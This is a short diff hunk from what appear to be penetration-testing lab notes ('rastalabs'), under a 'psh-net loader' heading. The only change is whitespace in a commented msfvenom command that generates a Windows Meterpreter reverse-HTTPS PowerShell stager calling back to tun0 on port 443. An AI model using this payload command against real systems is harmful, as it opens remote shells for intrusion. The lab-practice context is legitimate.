@@ -8,7 +8,7 @@
 
 
 #### psh-net loader ####
-#msfvenom --payload windows/x64/meterpreter/reverse_winhttps LHOST=tun0 LPORT=443 HandlerSSLCert=/root/rastalabs/msf.pem StagerVerifySSLCert=true -f psh-net -o 443.ps1
+# msfvenom --payload windows/x64/meterpreter/reverse_winhttps LHOST=tun0 LPORT=443 HandlerSSLCert=/root/rastalabs/msf.pem StagerVerifySSLCert=true -f psh-net -o 443.ps1
 
 
 #### PIVOTING AND PASSING SOCKS ####
